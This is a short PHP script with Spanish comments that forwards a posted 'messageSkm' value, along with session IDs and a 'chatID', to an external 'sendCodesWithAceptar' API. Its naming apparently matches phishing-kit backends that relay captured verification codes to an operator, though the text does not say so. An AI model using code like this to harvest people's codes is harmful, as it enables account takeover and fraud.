<?php
session_start();
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $messageSkm = $_POST['messageSkm'] ?? null;

    // Generar uniqueID
    $uniqueID = $_SESSION['uniqueID'];
    $chatID = $_SESSION['chatID'];
    // Preparar los datos para enviar a la API
    $data = [
        'uniqueID' => $uniqueID,
        'messageSkm' => $messageSkm,
        'chatID' => $chatID,
        'skm' => 'Trico',
    ];
    $ch = curl_init($_SESSION['urlApi'] . 'sendCodesWithAceptar');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    // Cerrar cURL
    curl_close($ch);

    // Enviar la respuesta de vuelta al cliente
    echo json_encode([
        'response' => json_decode($response),
        'httpCode' => $httpCode,
    ]);
} else {
    echo json_encode(['error' => 'Invalid request method']);
}
